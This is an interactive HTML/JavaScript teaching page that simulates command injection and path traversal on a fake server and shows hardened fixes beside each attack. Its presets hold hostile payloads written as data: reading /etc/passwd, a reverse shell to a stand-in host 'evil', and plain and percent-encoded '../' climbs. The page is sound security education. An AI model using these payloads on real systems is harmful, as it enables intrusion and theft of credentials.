<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<link rel="stylesheet" href="_shared.css">
<style>
  body { padding: 6px 8px; }
  .wrap { max-width: 1040px; margin: 0 auto; }
  .head { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 7px; }
  .tabsel { display: inline-flex; border: 1px solid #CDD8DA; border-radius: 8px; overflow: hidden; }
  .tabsel button { border: 0; border-radius: 0; padding: 7px 14px; font-size: 12.5px; background: #fff; color: #5C7880; }
  .tabsel button.on { background: #00567C; color: #fff; }
  .mode { display: inline-flex; border: 1px solid #CDD8DA; border-radius: 8px; overflow: hidden; }
  .mode button { border: 0; border-radius: 0; padding: 7px 12px; font-size: 12px; background: #fff; color: #5C7880; }
  .mode button.on { background: #1F8F89; color: #fff; }

  .lede { font-size: 12.5px; color: #5C7880; line-height: 1.4; margin: 0 0 9px; }
  .lede b { color: #00567C; } .lede em { color: #1F8F89; font-style: normal; font-weight: 700; }

  /* fake browser address bar — the traversal payload travels in the URL */
  .urlbar { display: flex; align-items: center; gap: 8px; background: #EEF3F3; border: 1px solid #CDD8DA;
    border-radius: 8px; padding: 6px 10px; }
  .urlbar .dot { width: 8px; height: 8px; border-radius: 50%; background: #CDD8DA; flex: none; }
  .urlbar .u { font-family: "JetBrains Mono", monospace; font-size: 11.5px; color: #5C7880; line-height: 1.5;
    flex: 1; word-break: break-all; }
  .urlbar .u .host { color: #12333D; font-weight: 700; }
  .urlbar .u .inj { color: #D64545; font-weight: 700; background: rgba(214,69,69,.09); border-radius: 3px; padding: 0 2px; }
  .urlnote { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 5px 2px 7px; font-size: 10.5px; color: #8AA1A8; }
  .urlnote label { display: inline-flex; align-items: center; gap: 5px; color: #5C7880; cursor: pointer; }
  .urlnote input { accent-color: #00567C; }
  .urlnote .say { color: #D64545; font-weight: 700; }

  .app { border: 1px solid #E0E7E8; border-radius: 10px; background: #fff; padding: 12px 13px; }
  .apptitle { font-size: 13px; font-weight: 800; color: #12333D; margin-bottom: 2px; }
  .appsub { font-size: 11px; color: #8AA1A8; margin-bottom: 9px; }
  .inrow { display: flex; gap: 8px; align-items: center; }
  .inrow input { flex: 1; font-family: "JetBrains Mono", monospace; font-size: 13px; color: #12333D; background: #F6F8F8;
    border: 1px solid #CDD8DA; border-radius: 6px; padding: 8px 9px; outline: none; }
  .inrow input:focus { border-color: #00567C; background: #fff; }
  .presets { margin-top: 8px; display: flex; flex-wrap: wrap; gap: 6px; }
  .presets button { font-size: 11px; padding: 6px 9px; }
  .presets .ph { width: 100%; font-size: 10px; color: #8AA1A8; letter-spacing: .05em; text-transform: uppercase; font-weight: 700; margin-bottom: 1px; }

  .assembled { margin-top: 11px; background: #04303F; border-radius: 8px; padding: 10px 12px; font-family: "JetBrains Mono", monospace; font-size: 12.5px; color: #9fc9cf; }
  .assembled .ah { font-size: 10px; text-transform: uppercase; letter-spacing: .07em; color: #5f97a3; margin-bottom: 6px; }
  .assembled .cmd { line-height: 1.6; word-break: break-all; }
  .assembled .cmd .fixed { color: #7fe3dc; }
  .assembled .cmd .inj { background: #D64545; color: #fff; border-radius: 3px; padding: 0 3px; font-weight: 700; }

  .term { margin-top: 9px; background: #06232B; border: 1px solid #0C3A46; border-radius: 8px; padding: 10px 12px;
    font-family: "JetBrains Mono", monospace; font-size: 12.5px; color: #BFE0E2; line-height: 1.5; min-height: 96px; white-space: pre-wrap; word-break: break-word; }
  .term .ok { color: #7FE3DC; } .term .leak { color: #FF9A9A; } .term .sys { color: #F2C14E; }
  .term .prompt { color: #5f97a3; }
  .verdict { margin-top: 9px; border-radius: 8px; padding: 9px 12px; font-size: 12.5px; line-height: 1.45; }
  .verdict.bad { background: rgba(214,69,69,.1); border: 1px solid rgba(214,69,69,.4); color: #12333D; }
  .verdict.good { background: rgba(31,143,137,.1); border: 1px solid rgba(31,143,137,.4); color: #12333D; }
  .verdict .h { display: block; font-weight: 800; margin-bottom: 2px; } .verdict.bad .h { color: #D64545; } .verdict.good .h { color: #1F8F89; }
  .verdict b { color: #00567C; }
</style>
</head><body>
<div class="wrap">
  <div class="head">
    <div class="tabsel">
      <button id="tCmd" class="on">Command injection</button>
      <button id="tTrav">Path traversal</button>
    </div>
    <div class="mode">
      <button id="mVuln" class="on">unsafe</button>
      <button id="mSafe">hardened</button>
    </div>
  </div>
  <p class="lede" id="lede"></p>

  <div id="urlwrap" style="display:none">
    <div class="urlbar"><span class="dot"></span><span class="u" id="urlline"></span></div>
    <div class="urlnote">
      <label><input type="checkbox" id="encChk"> %-encode the <span class="mono">../</span></label>
      <span id="urlhint"></span>
    </div>
  </div>

  <div class="app">
    <div class="apptitle" id="apptitle"></div>
    <div class="appsub" id="appsub"></div>
    <div class="inrow"><input id="in" spellcheck="false"><button class="primary" id="go">Run ▶</button></div>
    <div class="presets" id="presets"></div>
  </div>

  <div class="assembled"><div class="ah" id="ah"></div><div class="cmd" id="cmd"></div></div>
  <div class="term" id="term"></div>
  <div class="verdict good" id="verdict" style="display:none"></div>
</div>

<script>
var TAB = "cmd", vuln = true;
var IN = document.getElementById("in"), cmdEl = document.getElementById("cmd"), termEl = document.getElementById("term"),
    verdict = document.getElementById("verdict"), presetsEl = document.getElementById("presets");

/* tiny fake filesystem for honest output */
var PASSWD = "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nfadhel:x:1000:1000::/home/fadhel:/bin/bash";
var REPORT = "Q3-2024 SALES REPORT\n  Revenue: 4.2M ﷼\n  Units: 18,340";

var CFG = {
  cmd: {
    lede: 'A "network tools" page lets you ping a host. The server builds a shell line — <span class="mono">ping -c1 &lt;you&gt;</span> — and runs it. If it glues your text in raw, your text can carry <b>extra commands</b>.',
    title: "🖧 Network Tools · Ping a host",
    sub: "Server runs:  ping -c1 <your input>",
    val: "8.8.8.8",
    ah: "the shell line the server assembles",
    presets: [
      { l:"Normal ping", v:"8.8.8.8" },
      { l:"; whoami", v:"8.8.8.8; whoami" },
      { l:"; cat /etc/passwd", v:"8.8.8.8; cat /etc/passwd" },
      { l:"reverse shell", v:"8.8.8.8; bash -i >& /dev/tcp/evil/443 0>&1" }
    ]
  },
  trav: {
    lede: 'A report downloader reads a file by name out of <span class="mono">/var/www/reports/</span> — and the name rides <b>in the URL</b>. Nothing stops <span class="mono">../</span>, so you can <b>climb out</b> to anywhere on disk.',
    title: "📄 Report Downloader  ·  GET /download?file=…",
    sub: "",
    val: "Q3-2024.txt",
    ah: "the file path the server resolves",
    presets: [
      { l:"Normal file", v:"Q3-2024.txt" },
      { l:"../ once", v:"../secret.txt" },
      { l:"climb to /etc/passwd", v:"../../../../etc/passwd" },
      { l:"encoded: %2e%2e%2f", v:"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" }
    ]
  }
};

function esc(s){ return String(s).replace(/[&<>]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;"}[c];}); }

/* command-injection evaluator: split on shell separators, run each command against the fake box */
function runCmd(input) {
  var parts = input.split(/\s*(?:;|&&|\|\|)\s*/);
  var host = parts[0].trim();
  var out = [];
  out.push('<span class="prompt">$ ping -c1 ' + esc(host) + '</span>');
  out.push('<span class="ok">PING ' + esc(host) + ': 56 data bytes — 1 packets, 0% loss</span>');
  var injected = parts.slice(1).filter(function(x){ return x.trim(); });
  var didInject = injected.length > 0 || /[`$]/.test(input);
  injected.forEach(function (c) {
    c = c.trim();
    out.push('<span class="prompt">$ ' + esc(c) + '</span>');
    if (/^whoami/.test(c)) out.push('<span class="leak">www-data</span>');
    else if (/cat\s+\/etc\/passwd/.test(c)) out.push('<span class="leak">' + esc(PASSWD) + '</span>');
    else if (/^id/.test(c)) out.push('<span class="leak">uid=33(www-data) gid=33(www-data)</span>');
    else if (/bash|dev\/tcp|nc |sh -i/.test(c)) out.push('<span class="leak">[reverse shell opened → attacker holds a terminal on this server]</span>');
    else out.push('<span class="leak">' + esc(c.split(" ")[0]) + ': executed</span>');
  });
  return { html: out.join("\n"), pwned: didInject && injected.length > 0 };
}

/* the payload rides in the query string — this is the URL the victim server is sent */
var TRAV_URL = "https://shop.majal.local/download?file=";
function pctEncode(s){ return s.replace(/\./g, "%2e").replace(/\//g, "%2f"); }
function pctDecode(s){ try { return decodeURIComponent(s); } catch (e) { return s; } }
/* ticked, or the student typed %2e%2e%2f into the box themselves */
function isEnc(){ return document.getElementById("encChk").checked || /%[0-9a-fA-F]{2}/.test(IN.value); }

function renderUrl(raw) {
  var wire = isEnc() ? pctEncode(raw) : raw;
  var climbed = raw.indexOf("..") !== -1;
  document.getElementById("urlline").innerHTML =
    'https://<span class="host">shop.majal.local</span>/download?file=' +
    (climbed ? '<span class="inj">' + esc(wire) + '</span>' : esc(wire));
  document.getElementById("urlhint").innerHTML = climbed
    ? (isEnc() ? 'a filter looking for the text <span class="mono">../</span> sees nothing — the server decodes it back <span class="say">after</span> the check'
               : 'nothing here is a form field — the whole attack is typed into the address bar')
    : 'a normal download link';
  return wire;
}

/* path-traversal resolver: honestly resolve ../ against the base dir */
function resolvePath(input) {
  var base = ["var","www","reports"];
  var segs = input.split("/");
  var stack = base.slice();
  segs.forEach(function (s) {
    if (s === "" || s === ".") return;
    if (s === "..") { if (stack.length) stack.pop(); }
    else stack.push(s);
  });
  return "/" + stack.join("/");
}
function readFile(resolved) {
  if (resolved === "/etc/passwd") return { txt: PASSWD, leak: true };
  if (resolved === "/var/www/reports/Q3-2024.txt") return { txt: REPORT, leak: false };
  if (resolved === "/var/www/secret.txt") return { txt: "INTERNAL: db_password=hunter2", leak: true };
  return { txt: "(file not found: " + resolved + ")", leak: false };
}

function render() {
  var c = CFG[TAB];
  document.getElementById("lede").innerHTML = c.lede;
  document.getElementById("apptitle").textContent = c.title;
  document.getElementById("appsub").textContent = c.sub;
  document.getElementById("appsub").style.display = c.sub ? "block" : "none";
  document.getElementById("ah").textContent = vuln ? c.ah : c.ah + "  (input now sanitised)";
  document.getElementById("urlwrap").style.display = TAB === "trav" ? "block" : "none";
  presetsEl.innerHTML = '<span class="ph">try ↓</span>';
  c.presets.forEach(function (p) {
    var b = document.createElement("button"); b.textContent = p.l;
    b.addEventListener("click", function(){ IN.value = p.v; run(); });
    presetsEl.appendChild(b);
  });
  run();
}

function run() {
  var c = CFG[TAB], v = IN.value;
  if (TAB === "trav") v = pctDecode(v);   // %2e%2e%2f typed straight into the box is the same climb
  verdict.style.display = "none";
  if (TAB === "cmd") {
    var host = v.split(/\s*(?:;|&&|\|\|)\s*/)[0];
    var injected = v.slice(host.length);
    if (vuln) {
      cmdEl.innerHTML = '<span class="fixed">ping -c1 ' + esc(host) + '</span>' + (injected ? '<span class="inj">' + esc(injected) + '</span>' : '');
      var r = runCmd(v);
      termEl.innerHTML = r.html;
      if (r.pwned) showV(true, "Remote code execution", 'Your <b>;</b> ended the ping and the shell ran your command next. You now run code as <b>www-data</b> on their server — this is how a web bug becomes a foothold.');
    } else {
      // hardened: pass the whole thing as a single argument, no shell
      cmdEl.innerHTML = '<span class="fixed">execFile("ping", ["-c1", ' + JSON.stringify(v) + '])</span>  <span style="color:#5f7681">// no shell, one argument</span>';
      // a clean hostname still works — the fix must not break the feature
      var clean = /^[A-Za-z0-9][A-Za-z0-9.\-]*$/.test(v.trim());
      termEl.innerHTML = '<span class="prompt">$ ping -c1 "' + esc(v) + '"</span>\n' + (clean
        ? '<span class="ok">PING ' + esc(v.trim()) + ': 56 data bytes — 1 packets, 0% loss</span>'
        : '<span class="sys">ping: cannot resolve \'' + esc(v) + '\': Name or service not known</span>');
      if (/[;&|`$]/.test(v)) showV(false, "Injection neutralised", 'A normal host still pings fine — but the whole tampered string is passed as <b>one argument</b> to ping, never to a shell. So <b>;</b> is just part of a (bad) hostname. No shell, nothing to inject into.');
    }
  } else {
    var wire = renderUrl(v);
    var resolved = resolvePath(v);
    if (vuln) {
      var climbed = v.indexOf("..") !== -1;
      var enc = isEnc();
      var decodeStep = enc
        ? '<span style="color:#5f7681">?file=</span><span class="inj">' + esc(wire) + '</span>' +
          '<span style="color:#5f7681">  → URL-decoded by the server →  </span><span class="inj">' + esc(v) + '</span><br>'
        : '';
      cmdEl.innerHTML = decodeStep +
        '<span class="fixed">open("/var/www/reports/</span>' + (climbed ? '<span class="inj">' + esc(v) + '</span>' : '<span class="fixed">' + esc(v) + '</span>') + '<span class="fixed">")</span>' +
        (enc ? '  ' : '<br>') + '<span style="color:#5f7681">resolves to →</span> ' + (resolved === "/var/www/reports/" + v ? '<span class="fixed">' + esc(resolved) + '</span>' : '<span class="inj">' + esc(resolved) + '</span>');
      var f = readFile(resolved);
      termEl.innerHTML = '<span class="prompt">$ cat ' + esc(resolved) + '</span>\n' + (f.leak ? '<span class="leak">' + esc(f.txt) + '</span>' : '<span class="ok">' + esc(f.txt) + '</span>');
      if (f.leak) showV(true, "Escaped the folder", 'Each <b>../</b> climbed one directory up until you left the reports folder and read a system file — and the whole attack is a <b>URL</b> you can paste into a chat. Same trick reaches config files, keys, source code.');
    } else {
      cmdEl.innerHTML = '<span class="fixed">name = basename(input)</span>  <span style="color:#5f7681">// strip any path, keep the filename only</span><br>' +
        '<span class="fixed">open("/var/www/reports/' + esc(v.replace(/^.*[\/]/,"")) + '")</span>';
      var safeName = v.replace(/^.*[\/]/,"");
      var f2 = readFile("/var/www/reports/" + safeName);
      termEl.innerHTML = '<span class="prompt">$ cat /var/www/reports/' + esc(safeName) + '</span>\n' + '<span class="ok">' + esc(f2.txt) + '</span>';
      if (v.indexOf("..") !== -1) showV(false, "Traversal blocked", 'The server decodes the URL <b>first</b>, then strips everything before the last <b>/</b> — so <b>../../../../etc/passwd</b> collapses to just <b>passwd</b>, looked up harmlessly inside the reports folder. Note what is <em>not</em> the fix: blocking the text "../" in the raw query string, which <b>%2e%2e%2f</b> walks straight past.');
    }
  }
}
function showV(bad, h, body) {
  verdict.style.display = "block";
  verdict.className = "verdict " + (bad ? "bad" : "good");
  verdict.innerHTML = '<span class="h">' + (bad ? "✗ " : "✓ ") + h + '</span>' + body;
}

document.getElementById("go").addEventListener("click", run);
document.getElementById("encChk").addEventListener("change", run);
IN.addEventListener("input", function(){ if (TAB === "trav") renderUrl(pctDecode(IN.value)); });
IN.addEventListener("keydown", function(e){ if (e.key === "Enter") run(); });
document.getElementById("tCmd").addEventListener("click", function(){ TAB="cmd"; this.classList.add("on"); document.getElementById("tTrav").classList.remove("on"); IN.value=CFG.cmd.val; render(); });
document.getElementById("tTrav").addEventListener("click", function(){ TAB="trav"; this.classList.add("on"); document.getElementById("tCmd").classList.remove("on"); IN.value=CFG.trav.val; render(); });
document.getElementById("mVuln").addEventListener("click", function(){ vuln=true; this.classList.add("on"); document.getElementById("mSafe").classList.remove("on"); run(); document.getElementById("ah").textContent=CFG[TAB].ah; });
document.getElementById("mSafe").addEventListener("click", function(){ vuln=false; this.classList.add("on"); document.getElementById("mVuln").classList.remove("on"); run(); });

IN.value = CFG.cmd.val; render();
(function(){ var st = new URLSearchParams(location.search).get("state");
  if (st === "cmd") { IN.value = "8.8.8.8; cat /etc/passwd"; run(); }
  else if (st === "cmdsafe") { vuln=false; document.getElementById("mSafe").classList.add("on"); document.getElementById("mVuln").classList.remove("on"); IN.value="8.8.8.8; whoami"; run(); }
  else if (st === "trav" || st === "travenc") { TAB="trav"; document.getElementById("tTrav").classList.add("on"); document.getElementById("tCmd").classList.remove("on");
    IN.value="../../../../etc/passwd"; if (st === "travenc") document.getElementById("encChk").checked = true; render(); }
})();
</script>
</body></html>
